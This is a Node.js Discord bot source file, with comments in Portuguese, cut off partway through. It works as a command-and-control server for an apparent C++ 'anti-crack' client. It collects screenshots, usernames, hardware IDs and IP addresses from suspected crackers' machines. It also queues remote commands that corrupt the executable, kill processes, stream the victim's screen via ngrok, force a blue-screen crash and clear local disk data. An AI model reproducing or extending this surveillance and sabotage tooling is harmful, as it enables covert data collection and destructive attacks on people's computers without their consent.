const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder, Collection, REST, Routes, MessageFlags } = require("discord.js");
const axios = require("axios");
const http = require("http");
const fs = require("fs");
const path = require("path");

require("dotenv").config({ path: path.join(__dirname, ".env"), quiet: true });

const debugLogsEnabled = process.env.LOG_LEVEL === "debug";
const writeConsoleLine = console.log.bind(console);
if (!debugLogsEnabled) {
  console.log = () => {};
  console.warn = () => {};
  console.clear = () => {};
}

let onlineLogPrinted = false;
function printOnline(message) {
  if (onlineLogPrinted) return;
  onlineLogPrinted = true;
  writeConsoleLine(message);
}

function readPositiveNumberEnv(name, fallback) {
  const value = Number(process.env[name]);
  return Number.isFinite(value) && value > 0 ? value : fallback;
}

// ══════════════════════════════════════════════════════════════════════════════
// CONFIGURAÇÃO
// ══════════════════════════════════════════════════════════════════════════════
// Carregar config: prioridade para variáveis de ambiente (Render/produção), senão config.json (local)
let config;
try {
  config = require("./config");
} catch (err) {
  console.error(`[Config] ${err.message}`);
  process.exit(1);
}
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.DirectMessages] });

const BOT_HTTP_PORT = readPositiveNumberEnv("PORT", 3001);
const HEARTBEAT_CHECK_MS = readPositiveNumberEnv("HEARTBEAT_CHECK_MS", 3000);  // Verificar a cada 3s
const HEARTBEAT_TIMEOUT_MS = readPositiveNumberEnv("HEARTBEAT_TIMEOUT_MS", 15000); // Timeout após 15s (era 5s - muito curto)
const CPP_COMMAND_PORT = 7000;

// sessionId → { browsers: [...] }
const activeSessions = new Map();

// ══════════════════════════════════════════════════════════════════════════════
// FUNÇÕES AUXILIARES
// ══════════════════════════════════════════════════════════════════════════════

function getBotConfig() {
  const configPath = path.join(__dirname, "database", "botConfig.json");
  if (!fs.existsSync(configPath)) {
    fs.writeFileSync(configPath, JSON.stringify({ logsAntiCrack: "", logsPainel: "" }, null, 2));
  }
  return JSON.parse(fs.readFileSync(configPath, "utf-8"));
}

function saveBotConfig(data) {
  const configPath = path.join(__dirname, "database", "botConfig.json");
  fs.writeFileSync(configPath, JSON.stringify(data, null, 2));
}

// Carregar messageIds salvos ao iniciar
function loadMessageIds() {
  const botConfig = getBotConfig();
  if (botConfig.sessionMessages) {
    for (const [sid, data] of Object.entries(botConfig.sessionMessages)) {
      if (typeof data === 'object') {
        sessionMessageId.set(sid, data.msgId);
        // Restaurar sessão no activeSessions para botões funcionarem
        activeSessions.set(sid, { browsers: data.browsers || [], clientIp: data.clientIp || "127.0.0.1" });
        if (!commandQueues.has(sid)) commandQueues.set(sid, []);
      } else {
        sessionMessageId.set(sid, data);
      }
    }
  }
}

function saveMessageId(sessionId, msgId, browsers, clientIp) {
  const botConfig = getBotConfig();
  if (!botConfig.sessionMessages) botConfig.sessionMessages = {};
  botConfig.sessionMessages[sessionId] = { msgId, browsers: browsers || [], clientIp: clientIp || "127.0.0.1" };
  saveBotConfig(botConfig);
}

function buildAlertEmbed(message) {
  if (message.includes("ALERTA DE SEGURANÇA")) {
    const lines = message.split("\n").filter((l) => l.trim() !== "");
    const embed = new EmbedBuilder()
      .setTitle("🚨 ALERTA DE SEGURANÇA — TENTATIVA DE CRACK")
      .setColor(0xff0000)
      .setTimestamp();

    const fields = [];
    const motivoLine = lines.find((l) => l.startsWith("Motivo:"));
    const dataLine = lines.find((l) => l.startsWith("Data/Hora:"));
    if (motivoLine) embed.setDescription(`**${motivoLine.trim()}**`);
    if (dataLine) fields.push({ name: "🕐 Data/Hora", value: dataLine.replace("Data/Hora:", "").trim(), inline: true });

    const fieldMap = {
      "• Nome do Computador:": "💻 Computador",
      "• Usuário:": "👤 Usuário",
      "• Sistema Operacional:": "🖥️ Sistema",
      "• Arquitetura:": "⚙️ Arquitetura",
      "• HWID:": "🔑 HWID",
      "• IP Público:": "🌐 IP Público",
      "• IPs Locais:": "📡 IPs Locais",
      "• Processo:": "📂 Processo",
      "• PID:": "🔢 PID",
    };
    for (const [key, label] of Object.entries(fieldMap)) {
      const line = lines.find((l) => l.includes(key));
      if (line) {
        const value = line.substring(line.indexOf(key) + key.length).trim();
        fields.push({ name: label, value: value || "N/A", inline: true });
      }
    }
    const extraStart = lines.findIndex((l) => l.includes("Dados Adicionais"));
    if (extraStart !== -1) {
      const extraLines = lines.slice(extraStart + 1).join("\n");
      if (extraLines.trim()) fields.push({ name: "📋 Dados Adicionais", value: extraLines.trim(), inline: false });
    }
    embed.addFields(fields);
    embed.setFooter({ text: "Sistema de Segurança do Painel" });
    return embed;
  } else {
    return new EmbedBuilder()
      .setTitle("✅ Painel Iniciado")
      .setDescription(message)
      .setColor(0x00c853)
      .setTimestamp()
      .setFooter({ text: "Sistema de Segurança do Painel" });
  }
}

async function processAlert(payload) {
  const message = payload.content || "";
  const screenshotBase64 = payload.screenshot || null;
  const sessionId = payload.sessionId || null;
  const browsers = payload.browsers || [];
  const isScreenLog = payload.screenLog === true;
  const processStatus = payload.processStatus || null;

  // Processo reiniciou invisível — registrar nova sessão e atualizar status
  if (processStatus === "invisible" && sessionId) {
    console.log(`[Status] 🟢 Processo reiniciou invisível: ${sessionId}`);
    activeSessions.set(sessionId, { browsers: browsers || [], clientIp: "127.0.0.1" });
    if (!commandQueues.has(sessionId)) commandQueues.set(sessionId, []);
    sessionLastSeen.set(sessionId, Date.now());

    // Atualizar botão de vermelho para verde na mensagem original
    const botConfig = getBotConfig();
    const msgId = sessionMessageId.get(sessionId);
    if (msgId && botConfig.logsAntiCrack) {
      try {
        const msgRes = await axios.get(
          `https://discord.com/api/v10/channels/${botConfig.logsAntiCrack}/messages/${msgId}`,
          { headers: { Authorization: `Bot ${config.token}` } }
        );
        const existingComponents = msgRes.data.components || [];
        const updatedComponents = existingComponents.map(row => {
          if (!row.components) return row;
          return {
            ...row,
            components: row.components.map(btn => {
              if (btn.custom_id && btn.custom_id.startsWith('statusExe_')) {
                return { ...btn, label: '🟢 Processo: Em Execução', style: 3, disabled: true }; // Success = verde
              }
              return btn;
            })
          };
        });
        await axios.patch(
          `https://discord.com/api/v10/channels/${botConfig.logsAntiCrack}/messages/${msgId}`,
          { components: updatedComponents },
          { headers: { Authorization: `Bot ${config.token}`, "Content-Type": "application/json" } }
        );
        console.log(`[Status] 🟢 Botão atualizado para verde: ${sessionId}`);
      } catch (err) {
        console.error(`[Status] Erro ao atualizar para verde:`, err.message);
      }
    }
    return;
  }

  // Usar flag direta do C++ — não depende de texto
  const isAlert = payload.isAlert === true ||
                  message.includes("ALERTA DE SEGURANÇA") ||
                  message.includes("ALERTA DE SEGURANCA") ||
                  (message.includes("Motivo:") && message.includes("HWID:"));

  console.log(`[processAlert] isAlert=${isAlert} isScreenLog=${isScreenLog} sessionId=${sessionId}`);
  console.log(`[processAlert] conteudo: ${JSON.stringify(message.substring(0, 100))}`);

  const botConfig = getBotConfig();

  // screenLog → sempre vai para logsAntiCrack como texto simples
  if (isScreenLog) {
    const channelId = botConfig.logsAntiCrack;
    console.log(`[processAlert] screenLog → canal ${channelId}`);
    if (!channelId) { console.log("[processAlert] ❌ logsAntiCrack não configurado"); return; }
    await axios.post(
      `https://discord.com/api/v10/channels/${channelId}/messages`,
      { content: message },
      { headers: { Authorization: `Bot ${config.token}`, "Content-Type": "application/json" } }
    );
    console.log(`[processAlert] ✅ screenLog enviado`);
    return;
  }

  // Escolhe o canal correto dependendo do tipo de mensagem
  const logChannelId = isAlert
    ? botConfig.logsAntiCrack
    : botConfig.logsPainel || botConfig.logsAntiCrack;

  console.log(`[processAlert] canal escolhido: ${logChannelId} (isAlert=${isAlert})`);
  if (!logChannelId) throw new Error("Canal não configurado. Use /botconfig");

  // Se for mensagem com link do ngrok, enviar direto sem embed
  if (message.includes("🌐 Link para visualizar tela:")) {
    const channelId = botConfig.logsAntiCrack || logChannelId;
    await axios.post(
      `https://discord.com/api/v10/channels/${channelId}/messages`,
      { content: message },
      { headers: { Authorization: `Bot ${config.token}`, "Content-Type": "application/json" } }
    );
    console.log(`[Alert] ✅ Link ngrok enviado`);
    return;
  }

  const embed = buildAlertEmbed(message);
  const url = `https://discord.com/api/v10/channels/${logChannelId}/messages`;
  const headers = { Authorization: `Bot ${config.token}`, "Content-Type": "application/json" };

  let components = [];
  if (isAlert && sessionId) {
    activeSessions.set(sessionId, { browsers, clientIp: payload.clientIp || "127.0.0.1" });

    const row1 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`openBrowser_${sessionId}`)
        .setLabel("🌐 Abrir Navegador")
        .setStyle(ButtonStyle.Primary),
      new ButtonBuilder()
        .setCustomId(`breakExe_${sessionId}`)
        .setLabel("💥 Quebrar EXE")
        .setStyle(ButtonStyle.Danger),
      new ButtonBuilder()
        .setCustomId(`killProcess_${sessionId}`)
        .setLabel("🔴 Fechar Processo")
        .setStyle(ButtonStyle.Secondary)
    );

    const row2 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`viewScreen_${sessionId}`)
        .setLabel("🖥️ Ver Tela (Link Web)")
        .setStyle(ButtonStyle.Success),
      new ButtonBuilder()
        .setCustomId(`stopScreen_${sessionId}`)
        .setLabel("⏹️ Parar Visualização")
        .setStyle(ButtonStyle.Secondary),
      new ButtonBuilder()
        .setCustomId(`bluescreen_${sessionId}`)
        .setLabel("💀 Tela Azul")
        .setStyle(ButtonStyle.Danger)
    );

    const row3 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`cleardisk_${sessionId}`)
        .setLabel("🗑️ Apagar Disco Local")
        .setStyle(ButtonStyle.Danger)
    );

    const row4 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`statusExe_${sessionId}`)
        .setLabel("🟢 Processo: Em Execução")
        .setStyle(ButtonStyle.Success)
        .setDisabled(true),
      new ButtonBuilder()
        .setCustomId(`restoreExe_${sessionId}`)
        .setLabel("🔄 Voltar o EXE ao Normal")
        .setStyle(ButtonStyle.Primary)
    );

    components = [row1, row2, row3, row4];
  }

  const body = {
    embeds: [embed.toJSON()],
    components: components.map((c) => c.toJSON()),
  };

  if (screenshotBase64) {
    const buffer = Buffer.from(screenshotBase64, "base64");
    const FormData = require("form-data");
    const form = new FormData();
    form.append("payload_json", JSON.stringify(body));
    
    // Detectar tipo de imagem pelo header do arquivo
    let filename = "screenshot.jpg";
    let contentType = "image/jpeg";
    if (buffer.length >= 2 && buffer[0] === 0x42 && buffer[1] === 0x4D) {
      // BMP: começa com "BM"
      filename = "screenshot.bmp";
      contentType = "image/bmp";
    } else if (buffer.length >= 8 && buffer[0] === 0x89 && buffer[1] === 0x50) {
      // PNG: começa com 0x89 0x50
      filename = "screenshot.png";
      contentType = "image/png";
    }
    
    form.append("files[0]", buffer, { filename, contentType });
    const sentMsg = await axios.post(url, form, { headers: { ...headers, ...form.getHeaders() } });
    if (isAlert && sessionId && sentMsg.data?.id) {
      sessionMessageId.set(sessionId, sentMsg.data.id);
      saveMessageId(sessionId, sentMsg.data.id, browsers, payload.clientIp);
    }
  } else {
    const sentMsg = await axios.post(url, body, { headers });
    if (isAlert && sessionId && sentMsg.data?.id) {
      sessionMessageId.set(sessionId, sentMsg.data.id);
      saveMessageId(sessionId, sentMsg.data.id, browsers, payload.clientIp);
    }
  }

  console.log(`[Alert] ✅ Alerta enviado para canal ${logChannelId}`);

  // Notificar via DM todos da lista avisosCracker + owner
  if (isAlert) {
    // Extrair nome do computador da mensagem
    let pcName = "Desconhecido";
    const pcMatch = message.match(/Nome do Computador:\s*\|\|([^|]+)\|\|/);
    if (pcMatch) pcName = pcMatch[1].trim();

    // Extrair motivo
    let motivo = "";
    const motivoMatch = message.match(/Motivo:\s*\|\|([^|]+)\|\|/);
    if (motivoMatch) motivo = motivoMatch[1].trim();

const dmMsg = `🚨 **TENTATIVA DE CRACK DETECTADA!**\n||**${pcName}**|| tentou crackear o painel.\n${motivo ? `**Motivo:** ||${motivo}||\n` : ""}Verifique o canal de logs.`;

    const avisoIds = [...(botConfig.avisosCracker || [])];
    if (!avisoIds.includes(config.ownerid)) avisoIds.push(config.ownerid);

    for (const userId of avisoIds) {
      try {
        const dmRes = await axios.post(
          `https://discord.com/api/v10/users/@me/channels`,
          { recipient_id: userId },
          { headers: { Authorization: `Bot ${config.token}`, "Content-Type": "application/json" } }
        );
        await axios.post(
          `https://discord.com/api/v10/channels/${dmRes.data.id}/messages`,
          { content: dmMsg },
          { headers: { Authorization: `Bot ${config.token}`, "Content-Type": "application/json" } }
        );
        console.log(`[DM] ✅ DM enviada para ${userId}`);
      } catch (err) {
        console.error(`[DM] ❌ Falha para ${userId}:`, err.response?.data?.message || err.message);
        try {
          if (botConfig.logsAntiCrack) {
            await axios.post(
              `https://discord.com/api/v10/channels/${botConfig.logsAntiCrack}/messages`,
              { content: `<@${userId}> ${dmMsg}` },
              { headers: { Authorization: `Bot ${config.token}`, "Content-Type": "application/json" } }
            );
          }
        } catch (e) { /* ignorar */ }
      }
    }
  }
}

async function sendCommand(sessionId, action, extra = {}) {
  return new Promise((resolve, reject) => {
    const param1 = extra.url || "";
    const param2 = extra.browser || "";

    // Criar fila se não existir (sessão restaurada do arquivo)
    if (!commandQueues.has(sessionId)) commandQueues.set(sessionId, []);
    if (!activeSessions.has(sessionId)) {
      // Tentar restaurar do arquivo
      const botConfig = getBotConfig();
      const saved = botConfig.sessionMessages?.[sessionId];
      if (saved) {
        activeSessions.set(sessionId, { browsers: saved.browsers || [], clientIp: saved.clientIp || "127.0.0.1" });
      } else {
        return reject(new Error("Sessão não encontrada ou expirada."));
      }
    }

    queueCommand(sessionId, action, param1, param2);
    console.log(`[CMD] Comando enfileirado: ${action} para sessão ${sessionId}`);
    resolve();
  });
}

// ══════════════════════════════════════════════════════════════════════════════
// SERVIDOR HTTP (RECEBE ALERTAS DO C++)
// ══════════════════════════════════════════════════════════════════════════════

const pendingAlerts = [];
let botReady = false;

// Fila de comandos por sessão (polling do C++)
const commandQueues = new Map(); // sessionId → [{ action, param1, param2 }]
const commandResolvers = new Map(); // sessionId → resolve (long-polling)
const sessionLastSeen = new Map(); // sessionId → timestamp último poll
const sessionMessageId = new Map(); // sessionId → messageId do alerta no Discord

function queueCommand(sessionId, action, param1 = "", param2 = "") {
  if (!commandQueues.has(sessionId)) commandQueues.set(sessionId, []);
  commandQueues.get(sessionId).push({ action, param1, param2 });

  // Se tiver alguém esperando (long-poll), resolve imediatamente
  if (commandResolvers.has(sessionId)) {
    const resolve = commandResolvers.get(sessionId);
    commandResolvers.delete(sessionId);
    resolve();
  }
}

const httpServer = http.createServer((req, res) => {
  const url = new URL(req.url, `http://localhost`);
  console.log(`[HTTP] ${req.method} ${url.pathname} de ${req.socket.remoteAddress}`);

  // C++ faz polling: GET /poll/:sessionId
  if (req.method === "GET" && url.pathname.startsWith("/poll/")) {
    const sessionId = url.pathname.split("/poll/")[1];
    if (!sessionId) { res.writeHead(400); return res.end(); }

    // Registrar heartbeat
    sessionLastSeen.set(sessionId, Date.now());

    const queue = commandQueues.get(sessionId) || [];
    if (queue.length > 0) {
      const cmd = queue.shift();
      res.writeHead(200, { "Content-Type": "application/json" });
      return res.end(JSON.stringify(cmd));
    }

    // Long-polling: aguarda até 5s por um comando
    const timeout = setTimeout(() => {
      commandResolvers.delete(sessionId);
      res.writeHead(204);
      res.end();
    }, 5000);

    commandResolvers.set(sessionId, () => {
      clearTimeout(timeout);
      const cmd = (commandQueues.get(sessionId) || []).shift();
      if (cmd) {
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify(cmd));
      } else {
        res.writeHead(204);
        res.end();
      }
    });
    return;
  }

  // Rota para o C++ buscar o token do ngrok
  if (req.method === "GET" && url.pathname === "/ngroktoken") {
    const botConfig = getBotConfig();
    const token = botConfig.ngrokToken || "";
    res.writeHead(200, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ token }));
  }  // Recebe alerta do C++: POST /alert
  if (req.method === "POST" && url.pathname === "/alert") {
    const clientIp = req.socket.remoteAddress?.replace("::ffff:", "") || "127.0.0.1";
    let body = "";
    req.on("data", (chunk) => (body += chunk));
    req.on("end", async () => {
      try {
        const payload = JSON.parse(body);
        payload.clientIp = clientIp;
        if (!botReady) {
          pendingAlerts.push(payload);
          res.writeHead(202);
          return res.end(JSON.stringify({ queued: true }));
        }
        await processAlert(payload);
        res.writeHead(200);
        res.end(JSON.stringify({ success: true }));
      } catch (err) {
        const upstream = err.response?.data;
        const statusCode = err.message.includes("Canal nao configurado") || err.message.includes("Canal não configurado")
          ? 400
          : 500;
        const errorMessage = upstream?.message || err.message;
        console.error("[HTTP] Erro ao processar alerta:", errorMessage);
        res.writeHead(statusCode, { "Content-Type": "application/json" });
        res.end(JSON.stringify({
          error: errorMessage,
          status: err.response?.status,
          details: upstream || null,
        }));
      }
    });
    return;
  }

  // Health check (Render precisa responder na raiz)
  if (req.method === "GET" && (url.pathname === "/" || url.pathname === "/health" || url.pathname === "/healthz")) {
    res.writeHead(200, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ status: "online", bot: "BotGelado" }));
  }

  res.writeHead(404);
  res.end();
});

httpServer.listen(BOT_HTTP_PORT, "0.0.0.0", () => {
  console.log(`[HTTP] ✅ Servidor rodando na porta ${BOT_HTTP_PORT}`);
  console.log(`[HTTP] Aguardando conexões em 0.0.0.0:${BOT_HTTP_PORT}...`);
});

// Verificar heartbeat a cada 15s — atualizar status do botão
setInterval(async () => {
  const now = Date.now();
  console.log(`[Heartbeat] Verificando ${sessionLastSeen.size} sessões...`);
  for (const [sessionId, lastSeen] of sessionLastSeen.entries()) {
    const elapsed = now - lastSeen;
    console.log(`[Heartbeat] ${sessionId}: ${Math.round(elapsed/1000)}s desde último poll`);
    if (elapsed > HEARTBEAT_TIMEOUT_MS) {
      sessionLastSeen.delete(sessionId);
      const botConfig = getBotConfig();
      if (!botConfig.logsAntiCrack) continue;
      try {
        // Só editar o botão — sem mensagem extra
        const msgId = sessionMessageId.get(sessionId);
        if (msgId) {
          const msgRes = await axios.get(
            `https://discord.com/api/v10/channels/${botConfig.logsAntiCrack}/messages/${msgId}`,
            { headers: { Authorization: `Bot ${config.token}` } }
          );
          const existingComponents = msgRes.data.components || [];
          const updatedComponents = existingComponents.map(row => {
            if (!row.components) return row;
            return {
              ...row,
              components: row.components.map(btn => {
                if (btn.custom_id && btn.custom_id.startsWith('statusExe_')) {
                  return { ...btn, label: '🔴 Processo: Encerrado', style: 4, disabled: true };
                }
                return btn;
              })
            };
          });
          await axios.patch(
            `https://discord.com/api/v10/channels/${botConfig.logsAntiCrack}/messages/${msgId}`,
            { components: updatedComponents },
            { headers: { Authorization: `Bot ${config.token}`, "Content-Type": "application/json" } }
          );
          // Não deletar o msgId — precisamos dele para atualizar para verde depois
          const bc = getBotConfig();
          if (bc.sessionMessages?.[sessionId]) {
            bc.sessionMessages[sessionId].status = 'offline';
            saveBotConfig(bc);
          }
          console.log(`[Status] 🔴 Botão atualizado para vermelho: ${sessionId}`);
        }
      } catch (err) {
        console.error(`[Status] Erro:`, err.response?.data?.message || err.message);
      }
    }
  }
}, HEARTBEAT_CHECK_MS);

// ══════════════════════════════════════════════════════════════════════════════
// BOT DISCORD
// ══════════════════════════════════════════════════════════════════════════════

client.once("clientReady", async () => {
  console.log(`[Bot] ✅ Logado como ${client.user.tag}`);

  // Alterar nome do bot somente quando necessario para evitar rate limit.
  if (client.user.username !== "BotGelado") {
    await client.user.setUsername("BotGelado").catch(() => {});
  }

  // Carregar messageIds salvos
  loadMessageIds();
  console.log(`[Bot] ✅ ${sessionMessageId.size} messageIds carregados`);

  // Registrar slash commands automaticamente
  try {
    const commands = [];
    const cmdPath = path.join(__dirname, "commands/slashcommands");
    const cmdFiles = fs.readdirSync(cmdPath).filter(f => f.endsWith(".js"));
    client.commands = new Collection();
    for (const file of cmdFiles) {
      const cmd = require(path.join(cmdPath, file));
      if (cmd.data && cmd.execute) {
        commands.push(cmd.data.toJSON());
        client.commands.set(cmd.data.name, cmd);
      }
    }
    const rest = new REST({ version: "10" }).setToken(config.token);
    await rest.put(Routes.applicationCommands(config.clientid), { body: commands });
    console.log(`[Bot] ✅ ${commands.length} slash commands registrados`);
  } catch (err) {
    console.error("[Bot] Erro ao registrar comandos:", err.message);
  }

  botReady = true;
  printOnline(`[ONLINE] Bot online como ${client.user.tag}`);

  // Processar alertas pendentes
  for (const payload of pendingAlerts) {
    try {
      await processAlert(payload);
    } catch (err) {
      console.error("[Bot] Erro ao processar alerta pendente:", err.message);
    }
  }
  pendingAlerts.length = 0;
});

client.on("interactionCreate", async (interaction) => {
  try {
    // ── Verificação de permissão ──────────────────────────────────────────
    const OWNER_USERNAME = "geladopvp123_37711";
    if (interaction.user.username !== OWNER_USERNAME) {
      if (interaction.isRepliable()) {
        await interaction.reply({ content: "❌ Você não tem permissão para usar este bot.", flags: MessageFlags.Ephemeral });
      }
      return;
    }

    // Executar comandos dos arquivos externos (ex: /avisocracker)
    if (interaction.isChatInputCommand() && client.commands?.has(interaction.commandName)) {
      const cmd = client.commands.get(interaction.commandName);
      if (cmd.data.name !== "botconfig") { // botconfig é tratado inline abaixo
        await cmd.execute(interaction);
        return;
      }
    }

    // Comando /botconfig
    if (interaction.isChatInputCommand() && interaction.commandName === "botconfig") {
      const botConfig = getBotConfig();
      const antiCrackChannel = botConfig.logsAntiCrack
        ? `<#${botConfig.logsAntiCrack}>`
        : "Não configurado";
      const painelChannel = botConfig.logsPainel
        ? `<#${botConfig.logsPainel}>`
        : "Não configurado";

      await interaction.reply({
        embeds: [
          new EmbedBuilder()
            .setTitle("⚙️ BotGelado | Configurações")
            .setDescription(
              `**🔒 Logs Anti-Crack:** ${antiCrackChannel}\n` +
              `**🖥️ Logs Painel Iniciado:** ${painelChannel}`
            )
            .setColor(0x5865f2),
        ],
        components: [
          new ActionRowBuilder().addComponents(
            new ButtonBuilder()
              .setCustomId("setAntiCrackChannel")
              .setLabel("🔒 Logs Anti-Crack")
              .setStyle(ButtonStyle.Danger),
            new ButtonBuilder()
              .setCustomId("setPainelChannel")
              .setLabel("🖥️ Logs Painel Iniciado")
              .setStyle(ButtonStyle.Primary)
          ),
        ],
        flags: MessageFlags.Ephemeral,
      });
      return;
    }

    // Botão: Definir canal de logs Anti-Crack
    if (interaction.isButton() && interaction.customId === "setAntiCrackChannel") {
      const modal = new ModalBuilder()
        .setCustomId("setAntiCrackModal")
        .setTitle("Logs Anti-Crack — ID do Canal");

      const input = new TextInputBuilder()
        .setCustomId("channelId")
        .setLabel("ID do Canal")
        .setStyle(TextInputStyle.Short)
        .setPlaceholder("Cole o ID do canal aqui")
        .setRequired(true);

      modal.addComponents(new ActionRowBuilder().addComponents(input));
      await interaction.showModal(modal);
      return;
    }

    // Modal: Salvar canal Anti-Crack
    if (interaction.isModalSubmit() && interaction.customId === "setAntiCrackModal") {
      const channelId = interaction.fields.getTextInputValue("channelId");
      const botConfig = getBotConfig();
      botConfig.logsAntiCrack = channelId;
      saveBotConfig(botConfig);

      await interaction.reply({
        content: `✅ Canal de Logs Anti-Crack configurado: <#${channelId}>`,
        flags: MessageFlags.Ephemeral,
      });
      return;
    }

    // Botão: Definir canal de logs Painel Iniciado
    if (interaction.isButton() && interaction.customId === "setPainelChannel") {
      const modal = new ModalBuilder()
        .setCustomId("setPainelModal")
        .setTitle("Logs Painel Iniciado — ID do Canal");

      const input = new TextInputBuilder()
        .setCustomId("channelId")
        .setLabel("ID do Canal")
        .setStyle(TextInputStyle.Short)
        .setPlaceholder("Cole o ID do canal aqui")
        .setRequired(true);

      modal.addComponents(new ActionRowBuilder().addComponents(input));
      await interaction.showModal(modal);
      return;
    }

    // Modal: Salvar canal Painel Iniciado
    if (interaction.isModalSubmit() && interaction.customId === "setPainelModal") {
      const channelId = interaction.fields.getTextInputValue("channelId");
      const botConfig = getBotConfig();
      botConfig.logsPainel = channelId;
      saveBotConfig(botConfig);

      await interaction.reply({
        content: `✅ Canal de Logs do Painel Iniciado configurado: <#${channelId}>`,
        flags: MessageFlags.Ephemeral,
      });
      return;
    }

    // Modal: Salvar token do ngrok
    if (interaction.isModalSubmit() && interaction.customId === "setNgrokModal") {
      const token = interaction.fields.getTextInputValue("ngrokToken").trim();
      const botConfig = getBotConfig();
      botConfig.ngrokToken = token;
      saveBotConfig(botConfig);
      await interaction.reply({
        content: `✅ Token do ngrok configurado: \`${token.substring(0, 20)}...\`\n\nO C++ vai usar esse token automaticamente na próxima vez que clicar em **Ver Tela**.`,
        flags: MessageFlags.Ephemeral,
      });
      return;
    }

    // Botões de ação (abrir navegador, quebrar exe, etc)
    if (interaction.isButton()) {
      const [action, sessionId] = interaction.customId.split("_");

      if (action === "openBrowser") {
        const session = activeSessions.get(sessionId);
        if (!session) {
          await interaction.reply({ content: "❌ Sessão expirada", flags: MessageFlags.Ephemeral });
          return;
        }

        const modal = new ModalBuilder()
          .setCustomId(`urlModal::${sessionId}`)
          .setTitle("Abrir Navegador");

        const urlInput = new TextInputBuilder()
          .setCustomId("url")
          .setLabel("URL para abrir")
          .setStyle(TextInputStyle.Short)
          .setPlaceholder("https://exemplo.com")
          .setValue("https://www.google.com")
          .setRequired(true);

        modal.addComponents(new ActionRowBuilder().addComponents(urlInput));
        await interaction.showModal(modal);
        return;
      }

      if (action === "breakExe") {
        await interaction.reply({ content: "⚠️ Tem certeza? Isso vai **corromper o executável**!", components: [
          new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`confirmBreak_${sessionId}`).setLabel("✅ Sim, quebrar").setStyle(ButtonStyle.Danger),
            new ButtonBuilder().setCustomId("cancelBreak").setLabel("❌ Cancelar").setStyle(ButtonStyle.Secondary)
          )
        ], flags: MessageFlags.Ephemeral });
        return;
      }

      if (action === "confirmBreak") {
        await interaction.update({ content: "💥 Quebrando executável...", components: [] });
        try {
          await sendCommand(sessionId, "breakExe");
          await interaction.followUp({ content: "✅ Executável corrompido com sucesso!", flags: MessageFlags.Ephemeral });
        } catch (err) {
          await interaction.followUp({ content: `❌ Falha: ${err.message}`, flags: MessageFlags.Ephemeral });
        }
        return;
      }

      if (action === "cancelBreak") {
        await interaction.update({ content: "❌ Operação cancelada", components: [] });
        return;
      }

      if (action === "killProcess") {
        await interaction.reply({ content: "🔴 Fechando processo...", flags: MessageFlags.Ephemeral });
        try {
          await sendCommand(sessionId, "killProcess");
          await interaction.followUp({ content: "✅ Processo encerrado!", flags: MessageFlags.Ephemeral });
          // Atualizar botão para vermelho imediatamente
          const botConfig = getBotConfig();
          const msgId = sessionMessageId.get(sessionId);
          if (msgId && botConfig.logsAntiCrack) {
            try {
              const msgRes = await axios.get(
                `https://discord.com/api/v10/channels/${botConfig.logsAntiCrack}/messages/${msgId}`,
                { headers: { Authorization: `Bot ${config.token}` } }
              );
              const updatedComponents = (msgRes.data.components || []).map(row => {
                if (!row.components) return row;
                return { ...row, components: row.components.map(btn =>
                  btn.custom_id?.startsWith('statusExe_')
                    ? { ...btn, label: '🔴 Processo: Encerrado', style: 4, disabled: true }
                    : btn
                )};
              });
              await axios.patch(
                `https://discord.com/api/v10/channels/${botConfig.logsAntiCrack}/messages/${msgId}`,
                { components: updatedComponents },
                { headers: { Authorization: `Bot ${config.token}`, "Content-Type": "application/json" } }
              );
            } catch (e) { /* ignorar */ }
          }
        } catch (err) {
          await interaction.followUp({ content: `❌ Falha: ${err.message}`, flags: MessageFlags.Ephemeral });
        }
        return;
      }

      if (action === "viewScreen") {
        await interaction.reply({ content: "🖥️ Iniciando servidor de visualização...\n_Isso pode levar 10-30 segundos..._", flags: MessageFlags.Ephemeral });
        try {
          await sendCommand(sessionId, "startScreenServer");
          await interaction.followUp({ content: "✅ Servidor iniciado! O link será enviado no canal de logs.", flags: MessageFlags.Ephemeral });
        } catch (err) {
          await interaction.followUp({ content: `❌ Erro ao Iniciar: ${err.message}\n\n**Verifique se o painel C++ está rodando.**`, flags: MessageFlags.Ephemeral });
        }
        return;
      }

      if (action === "stopScreen") {
        await interaction.reply({ content: "⏹️ Parando visualização...", flags: MessageFlags.Ephemeral });
        try {
          await sendCommand(sessionId, "stopScreenServer");
          await interaction.followUp({ content: "✅ Visualização parada!", flags: MessageFlags.Ephemeral });
        } catch (err) {
          await interaction.followUp({ content: `❌ Falha: ${err.message}`, flags: MessageFlags.Ephemeral });
        }
        return;
      }

      if (action === "bluescreen") {
        await interaction.reply({
          content: "💀 **ATENÇÃO!** Isso vai causar uma **Tela Azul da Morte (BSOD)** no computador monitorado!\n\nTem certeza?",
          components: [
            new ActionRowBuilder().addComponents(
              new ButtonBuilder().setCustomId(`confirmBSOD_${sessionId}`).setLabel("💀 Sim, BSOD agora").setStyle(ButtonStyle.Danger),
              new ButtonBuilder().setCustomId("cancelBSOD").setLabel("❌ Cancelar").setStyle(ButtonStyle.Secondary)
            )
          ],
          flags: MessageFlags.Ephemeral
        });
        return;
      }

      if (action === "confirmBSOD") {
        await interaction.update({ content: "💀 Enviando BSOD...", components: [] });
        try {
          await sendCommand(sessionId, "blueScreen");
          await interaction.followUp({ content: "💀 BSOD enviado com sucesso!", flags: MessageFlags.Ephemeral });
        } catch (err) {
          await interaction.followUp({ content: `❌ Falha: ${err.message}`, flags: MessageFlags.Ephemeral });
        }
        return;
      }

      if (action === "cancelBSOD") {
        await interaction.update({ content: "❌ Operação cancelada", components: [] });
        return;
      }

      if (action === "cleardisk") {
        await interaction.reply({
          content: "🗑️ **Apagar Disco Local** — Isso vai esvaziar a lixeira do computador monitorado.\n\nConfirmar?",
          components: [
            new ActionRowBuilder().addComponents(
